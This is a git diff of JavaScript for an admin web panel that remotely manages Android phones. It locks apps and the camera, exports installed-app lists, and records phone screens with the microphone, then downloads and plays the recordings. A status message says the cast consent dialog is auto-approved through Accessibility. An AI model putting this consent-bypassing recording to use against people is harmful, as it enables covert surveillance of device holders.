+          alertAdminAppControlError(e);
+        }
+      });
+    });
+    list.querySelectorAll(".btn-admin-app-unlock").forEach((btn) => {
+      btn.addEventListener("click", async () => {
+        const pkg = btn.getAttribute("data-package") || "";
+        if (!pkg) return;
+        btn.disabled = true;
+        try {
+          await sendAdminAppControl("UNBLOCK", pkg, "", "app");
+          setTimeout(async () => {
+            await refreshAdminAppsBlocksPanel();
+            await refreshAdminAppsPanel();
+          }, 1000);
+        } catch (e) {
+          btn.disabled = false;
+          alertAdminAppControlError(e);
+        }
+      });
+    });
+  } catch (e) {
+    list.textContent = e instanceof Error ? e.message : String(e);
+    list.classList.add("muted");
+  }
+}
+
+async function openAdminAppDetail(packageName) {
+  const detail = document.getElementById("admin-app-detail");
+  if (!detail || !exploreCtx) return;
+  detail.hidden = false;
+  detail.textContent = "Loading…";
+  try {
+    const data = await api(
+      `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/apps/detail?packageName=${encodeURIComponent(packageName)}`
+    );
+    const a = data.app || {};
+    const perms = Array.isArray(a.permissions) ? a.permissions.slice(0, 40) : [];
+    const blocked = isAdminPackageBlockedNow(a.packageName || packageName);
+    const block = adminActiveBlocks.find(
+      (b) => b.packageName === (a.packageName || packageName) && b.status === "active"
+    );
+    detail.innerHTML = `
+      <h2>${escapeHtml(a.appName || packageName)}${blocked ? '<span class="app-badge-blocked">Blocked</span>' : ""}</h2>
+      <p><code>${escapeHtml(a.packageName || packageName)}</code></p>
+      <p>Version ${escapeHtml(a.versionName || "?")} (${a.versionCode || 0})</p>
+      <p>Installed ${a.firstInstallTime ? new Date(a.firstInstallTime).toLocaleString() : "—"}</p>
+      <p>Updated ${a.lastUpdateTime ? new Date(a.lastUpdateTime).toLocaleString() : "—"}</p>
+      <p>Target SDK ${a.targetSdk || "—"} · Min SDK ${a.minSdk || "—"}</p>
+      <p>Install source: ${escapeHtml(a.installSource || "—")}</p>
+      <p>ABI: ${(a.supportedAbis || []).map(escapeHtml).join(", ") || "—"}</p>
+      ${
+        blocked
+          ? `<p><strong>Block:</strong> ${escapeHtml(adminFormatBlockRemaining(block?.expiresAt || 0))}</p>`
+          : ""
+      }
+      <div class="app-control-actions">
+        <button type="button" class="btn-danger-soft" id="btn-admin-detail-block">${blocked ? "Extend lock" : "Lock app"}</button>
+        <button type="button" class="btn-primary" id="btn-admin-detail-unblock" ${blocked ? "" : "disabled"}>Unlock</button>
+      </div>
+      ${
+        perms.length
+          ? `<details><summary>Permissions (${perms.length})</summary><ul>${perms.map((p) => `<li><code>${escapeHtml(p)}</code></li>`).join("")}</ul></details>`
+          : ""
+      }
+    `;
+    document.getElementById("btn-admin-detail-block")?.addEventListener("click", async () => {
+      try {
+        await sendAdminAppControl("BLOCK", a.packageName || packageName, a.appName || packageName, "app");
+        setTimeout(() => void openAdminAppDetail(packageName), 1200);
+        await refreshAdminAppsBlocksPanel();
+        await refreshAdminAppsPanel();
+      } catch (e) {
+        alertAdminAppControlError(e);
+      }
+    });
+    document.getElementById("btn-admin-detail-unblock")?.addEventListener("click", async () => {
+      try {
+        await sendAdminAppControl("UNBLOCK", a.packageName || packageName, "", "app");
+        setTimeout(() => void openAdminAppDetail(packageName), 1000);
+        await refreshAdminAppsBlocksPanel();
+        await refreshAdminAppsPanel();
+      } catch (e) {
+        alertAdminAppControlError(e);
+      }
+    });
+  } catch (e) {
+    detail.textContent = e instanceof Error ? e.message : String(e);
+  }
+}
+
+function wireAdminAppsPanel() {
+  if (adminAppsPanelWired) return;
+  adminAppsPanelWired = true;
+  document.getElementById("btn-admin-apps-refresh")?.addEventListener("click", () => {
+    void refreshAdminAppsPanel();
+  });
+  document.getElementById("btn-admin-blocks-refresh")?.addEventListener("click", () => {
+    void refreshAdminAppsBlocksPanel();
+  });
+  document.getElementById("btn-admin-camera-lock")?.addEventListener("click", async () => {
+    try {
+      await sendAdminAppControl("CAMERA_LOCK");
+      setTimeout(() => refreshAdminAppsBlocksPanel(), 1500);
+    } catch (e) {
+      alertAdminAppControlError(e);
+    }
+  });
+  document.getElementById("btn-admin-camera-unlock")?.addEventListener("click", async () => {
+    try {
+      await sendAdminAppControl("CAMERA_UNLOCK");
+      setTimeout(() => refreshAdminAppsBlocksPanel(), 1200);
+    } catch (e) {
+      alertAdminAppControlError(e);
+    }
+  });
+  document.getElementById("btn-admin-apps-export")?.addEventListener("click", async () => {
+    if (!exploreCtx) return;
+    try {
+      const data = await api(
+        `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/apps?limit=500`
+      );
+      const blob = new Blob([JSON.stringify(data.items || [], null, 2)], { type: "application/json" });
+      const a = document.createElement("a");
+      a.href = URL.createObjectURL(blob);
+      a.download = `apps-${exploreCtx.deviceId}.json`;
+      a.click();
+    } catch (e) {
+      alert(e instanceof Error ? e.message : String(e));
+    }
+  });
+  document.getElementById("admin-apps-search")?.addEventListener("input", () => {
+    clearTimeout(window.__adminAppsSearchT);
+    window.__adminAppsSearchT = setTimeout(() => refreshAdminAppsPanel(), 300);
+  });
+  document.getElementById("admin-apps-filter")?.addEventListener("change", () => {
+    void refreshAdminAppsPanel();
+  });
 }
 
 function renderRecordingPanel() {
   const el = document.getElementById("admin-recording-body");
+  const transferBox = document.getElementById("admin-rec-transfer");
   if (!el || !exploreCtx) return;
   const items = [...(exploreCtx.data.screenRecordings || [])].sort(
     (a, b) => Number(b.createdAt || b.startedAt || 0) - Number(a.createdAt || a.startedAt || 0)
   );
+  const latest = items[0];
+  if (latest?.status) {
+    applyAdminRecUiFromStatus(latest.status, Number(latest.durationMs || 0));
+    if (transferBox) {
+      if (latest.status === "Recording" || latest.status === "Paused") {
+        transferBox.hidden = false;
+        transferBox.textContent = `${latest.status} · ${adminFormatRecTime(latest.durationMs || adminLocalRecElapsedMs())}`;
+      } else if (latest.status === "Uploading" || latest.status === "Encoding") {
+        transferBox.hidden = false;
+        transferBox.textContent = `${latest.status}… ${adminFormatRecTime(latest.durationMs || 0)} recorded.`;
+      } else if (latest.status === "Failed") {
+        transferBox.hidden = false;
+        transferBox.textContent = `Failed: ${latest.errorMessage || "See phone."}`;
+      } else if (latest.status === "Completed") {
+        transferBox.hidden = false;
+        transferBox.textContent = `Completed · ${adminFormatRecTime(latest.durationMs || 0)} · tap Play below.`;
+      } else if (/Waiting|Permission/i.test(String(latest.status))) {
+        transferBox.hidden = false;
+        transferBox.textContent = "Waiting for Cast approval on the phone (auto-approved when Accessibility is on)…";
+      }
+    }
+  }
   if (!items.length) {
     el.innerHTML = emptyHint(
-      "No screen recordings yet.\n\nTap Start recording, accept the Android cast dialog on the phone, then Stop. Completed files appear here to Play / Download."
+      "No screen recordings yet.\n\nTap Record Screen, accept the Android cast dialog on the phone, then Stop. Completed files appear here to Play / Download."
     );
     return;
   }
-  el.innerHTML = `<ul class="admin-readable-list">${items
+  el.innerHTML = items
     .slice(0, 40)
     .map((r) => {
       const name = r.displayName || r.name || r.id || "recording";
       const status = String(r.status || "");
       const transferId = String(r.transferId || r.uploadTransferId || "");
-      const ready =
-        transferId && /completed|ready|done|uploaded/i.test(status);
-      const actions = ready
-        ? `<div class="admin-gallery-actions" style="margin-top:6px;">
-            <button type="button" class="btn-primary btn-admin-rec-open" data-transfer-id="${escapeHtml(transferId)}" data-name="${escapeHtml(name)}">Play / Download</button>
-          </div>`
-        : transferId
-          ? `<div class="muted" style="margin-top:4px;font-size:0.82rem;">Transfer ${escapeHtml(transferId.slice(0, 8))}… — wait until Completed, then Refresh.</div>`
-          : "";
-      return `<li>
-        <strong>${escapeHtml(name)}</strong>
-        <span class="muted"> · ${escapeHtml(status)} · ${fmtTime(r.createdAt || r.startedAt)}</span>
-        ${actions}
-      </li>`;
+      const key = transferId ? `adminrec::${exploreCtx.deviceId}::${transferId}` : "";
+      const st = key ? adminRecItemState.get(key) : null;
+      const ready = transferId && /completed|ready|done|uploaded/i.test(status);
+      let btnLabel = "Download";
+      let btnClass = "btn-secondary btn-admin-rec-open";
+      if (st?.status === "downloading") {
+        btnLabel = `${Math.max(0, Math.min(100, Number(st.progress) || 0))}%`;
+        btnClass += " btn-file-progress";
+      } else if (st?.status === "ready") {
+        btnLabel = "Play";
+        btnClass += " btn-file-ready";
+      } else if (st?.status === "error") {
+        btnLabel = "Retry";
+        btnClass += " btn-file-error";
+      } else if (ready) {
+        btnLabel = "Download";
+      }
+      return `<div class="rec-row surface">
+        <div><strong>${escapeHtml(name)}</strong> <span class="status-badge">${escapeHtml(status)}</span></div>
+        <div class="muted">${fmtTime(r.createdAt || r.startedAt)} · ${adminFormatRecTime(Number(r.durationMs || 0))}</div>
+        ${ready ? `<div class="page-actions"><button type="button" class="${btnClass}" data-transfer-id="${escapeHtml(transferId)}" data-name="${escapeHtml(name)}" data-rec-key="${escapeHtml(key)}" ${st?.status === "downloading" ? "disabled" : ""}>${escapeHtml(btnLabel)}</button></div>` : ""}
+      </div>`;
     })
-    .join("")}</ul>`;
+    .join("");
   el.querySelectorAll(".btn-admin-rec-open").forEach((btn) => {
-    btn.addEventListener("click", () => {
-      void openAdminRecording(
-        btn.getAttribute("data-transfer-id") || "",
-        btn.getAttribute("data-name") || "recording.mp4"
-      );
+    btn.addEventListener("click", async () => {
+      try {
+        await downloadAdminRecordingItem(
+          btn.getAttribute("data-transfer-id") || "",
+          btn.getAttribute("data-name") || "recording.mp4",
+          btn
+        );
+      } catch (e) {
+        alert(formatApiError(e));
+      }
     });
   });
+  document.getElementById("btn-admin-rec-inline-close")?.addEventListener("click", () => {
+    const wrap = document.getElementById("admin-rec-inline-viewer");
+    const body = document.getElementById("admin-rec-inline-body");
+    if (body) body.innerHTML = "";
+    if (wrap) wrap.hidden = true;
+  }, { once: true });
+}
+
+async function downloadAdminRecordingItem(transferId, displayName, btn) {
+  if (!exploreCtx || !transferId) return;
+  const key = `adminrec::${exploreCtx.deviceId}::${transferId}`;
+  const existing = adminRecItemState.get(key);
+  if (existing?.status === "ready" && existing.objectUrl) {
+    showAdminRecInline(existing);
+    return;
+  }
+  let state = { status: "downloading", progress: 3, displayName: displayName || "recording" };
+  adminRecItemState.set(key, state);
+  if (btn) {
+    btn.textContent = "3%";
+    btn.disabled = true;
+    btn.classList.add("btn-file-progress");
+  }
+  try {
+    const deadline = Date.now() + 90_000;
+    while (Date.now() < deadline) {
+      const data = await api(
+        `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/transfers/${encodeURIComponent(transferId)}`
+      );
+      const t = data.transfer || {};
+      const st = String(t.status || "");
+      const p = Math.max(3, Math.min(99, Number(t.progress) || 3));
+      state = { ...state, status: "downloading", progress: p };
+      adminRecItemState.set(key, state);
+      if (btn) btn.textContent = `${p}%`;
+      if (st === "ready") {
+        const url = `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/transfers/${encodeURIComponent(transferId)}/content`;
+        const res = await fetch(url, { headers: { Authorization: `Bearer ${idToken}` } });
+        if (!res.ok) throw new Error(`Download failed (HTTP ${res.status})`);
+        const blob = await res.blob();
+        const objectUrl = URL.createObjectURL(blob);
+        const ready = { status: "ready", progress: 100, displayName: displayName || "recording", objectUrl, blob };
+        adminRecItemState.set(key, ready);
+        if (btn) {
+          btn.textContent = "Play";
+          btn.disabled = false;
+          btn.classList.add("btn-file-ready");
+        }
+        showAdminRecInline(ready);
+        return;
+      }
+      if (st === "failed" || st === "cancelled") throw new Error(t.errorMessage || `Transfer ${st}`);
+      await new Promise((r) => setTimeout(r, 1200));
+    }
+    throw new Error("Timed out waiting for recording file.");
+  } catch (e) {
+    state = { ...state, status: "error", progress: 0 };
+    adminRecItemState.set(key, state);
+    if (btn) {
+      btn.textContent = "Retry";
+      btn.disabled = false;
+      btn.classList.add("btn-file-error");
+    }
+    throw e;
+  }
+}
+
+function showAdminRecInline(entry) {
+  const wrap = document.getElementById("admin-rec-inline-viewer");
+  const body = document.getElementById("admin-rec-inline-body");
+  const title = document.getElementById("admin-rec-inline-title");
+  if (!wrap || !body || !entry?.objectUrl) return;
+  if (title) title.textContent = entry.displayName || "Screen recording";
+  body.innerHTML = "";
+  const video = document.createElement("video");
+  video.src = entry.objectUrl;
+  video.controls = true;
+  video.playsInline = true;
+  body.appendChild(video);
+  wrap.hidden = false;
+  video.play().catch(() => {});
 }
 
 function fmtTimeAmPm(ms) {
@@ -1937,26 +3423,6 @@ function wireAdminUsageCollapse(root) {
   });
 }
 
-function renderAppsPanel() {
-  const el = document.getElementById("admin-apps-body");
-  if (!el || !exploreCtx) return;
-  const items = exploreCtx.data.apps || [];
-  if (!items.length) {
-    el.innerHTML = emptyHint("No apps cached. Tap Sync apps.");
-    return;
-  }
-  el.innerHTML = `<ul class="admin-readable-list">${items
-    .slice(0, 100)
-    .map(
-      (a) =>
-        `<li>
-          <strong>${escapeHtml(a.appName || a.label || a.packageName)}</strong>
-          <div class="muted"><code>${escapeHtml(a.packageName || "")}</code> · v${escapeHtml(a.versionName || "?")}</div>
-        </li>`
-    )
-    .join("")}</ul>`;
-}
-
 function renderAppUsagePanel() {
   const el = document.getElementById("admin-app-usage-body");
   if (!el || !exploreCtx) return;
@@ -2024,18 +3490,57 @@ function wireAdminCommands() {
     };
   });
   const recStart = document.getElementById("btn-admin-rec-start");
+  const recPause = document.getElementById("btn-admin-rec-pause");
+  const recResume = document.getElementById("btn-admin-rec-resume");
   const recStop = document.getElementById("btn-admin-rec-stop");
   const recRefresh = document.getElementById("btn-admin-rec-refresh");
   if (recStart) {
     recStart.onclick = () => {
       if (!exploreCtx) return;
-      void runAdminScreenRecord(exploreCtx.ownerUid, exploreCtx.deviceId, "SCREEN_RECORD_START");
+      adminSetRecStatus("Waiting for Permission");
+      adminSetRecTimer(0);
+      stopAdminRecTimer();
+      const quality = document.getElementById("admin-rec-quality")?.value || "720p";
+      const fps = Number(document.getElementById("admin-rec-fps")?.value || 30);
+      const withMic = Boolean(document.getElementById("admin-rec-mic")?.checked);
+      void runAdminScreenRecord(exploreCtx.ownerUid, exploreCtx.deviceId, "SCREEN_RECORD_START", {
+        quality,
+        fps,
+        withMic,
+      });
+      startAdminRecordingsPoll();
+    };
+  }
+  if (recPause) {
+    recPause.onclick = () => {
+      if (!exploreCtx) return;
+      adminRecLocalPauseAt = Date.now();
+      adminSetRecStatus("Paused");
+      void runAdminScreenRecord(exploreCtx.ownerUid, exploreCtx.deviceId, "SCREEN_RECORD_PAUSE");
+      startAdminRecordingsPoll();
+    };
+  }
+  if (recResume) {
+    recResume.onclick = () => {
+      if (!exploreCtx) return;
+      if (adminRecLocalPauseAt) {
+        adminRecLocalPausedMs += Date.now() - adminRecLocalPauseAt;
+        adminRecLocalPauseAt = 0;
+      }
+      adminSetRecStatus("Recording");
+      startAdminRecTimer(adminLocalRecElapsedMs());
+      void runAdminScreenRecord(exploreCtx.ownerUid, exploreCtx.deviceId, "SCREEN_RECORD_RESUME");
+      startAdminRecordingsPoll();
     };
   }
   if (recStop) {
     recStop.onclick = () => {
       if (!exploreCtx) return;
+      adminSetRecStatus("Stopping…");
+      adminSetRecTimer(adminLocalRecElapsedMs());
+      stopAdminRecTimer();
       void runAdminScreenRecord(exploreCtx.ownerUid, exploreCtx.deviceId, "SCREEN_RECORD_STOP");
+      startAdminRecordingsPoll();
     };
   }
   if (recRefresh) {
@@ -2046,14 +3551,19 @@ function wireAdminCommands() {
   }
 }
 
-async function runAdminScreenRecord(ownerUid, deviceId, action) {
+async function runAdminScreenRecord(ownerUid, deviceId, action, opts = {}) {
   const status = document.getElementById("admin-action-status");
+  const quality = opts.quality || document.getElementById("admin-rec-quality")?.value || "720p";
+  const fps = Number(opts.fps ?? document.getElementById("admin-rec-fps")?.value ?? 30);
+  const withMic = opts.withMic ?? Boolean(document.getElementById("admin-rec-mic")?.checked);
   try {
     if (status) {
       status.textContent =
         action === "SCREEN_RECORD_START"
-          ? "Starting screen recording (creating upload transfer)…"
-          : "Stopping screen recording…";
+          ? "Starting screen recording…"
+          : action === "SCREEN_RECORD_STOP"
+            ? "Stopping screen recording…"
+            : `Sending ${action}…`;
     }
     const result = await api(
       `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/command`,
@@ -2061,19 +3571,19 @@ async function runAdminScreenRecord(ownerUid, deviceId, action) {
         method: "POST",
         body: JSON.stringify({
           action,
-          payload: { quality: "720p", fps: 30, withMic: true, autoUpload: true },
+          payload: { quality, fps, withMic, autoUpload: true },
         }),
       }
     );
     const tid = result.transfer?.transferId || "";
     if (status) {
       status.textContent = tid
-        ? `${action} sent · transfer ${tid.slice(0, 8)}… Accept cast dialog on phone. Refreshing in 4s.`
-        : `${action} sent. Refreshing in 4s.`;
+        ? `${action} sent · transfer ${tid.slice(0, 8)}… Accept cast on phone.`
+        : `${action} sent.`;
     }
-    setTimeout(() => {
-      void openDeviceExplore(ownerUid, deviceId);
-    }, 4000);
+    if (action !== "SCREEN_RECORD_START") {
+      setTimeout(() => void openDeviceExplore(ownerUid, deviceId), 2500);
+    }
   } catch (e) {
     if (status) status.textContent = formatApiError(e);
     else alert(formatApiError(e));
@@ -2792,6 +4302,8 @@ async function main() {
   document.querySelectorAll("#admin-phone-tabs .phone-tab").forEach((btn) => {
     btn.addEventListener("click", () => setPhoneTab(btn.getAttribute("data-phone-tab") || "camera"));
   });
+  wireAdminScreenMirrorPanel();
+  wireAdminAppsPanel();
 
   document.getElementById("btn-admin-add")?.addEventListener("click", async () => {
     const input = document.getElementById("admin-email-input");
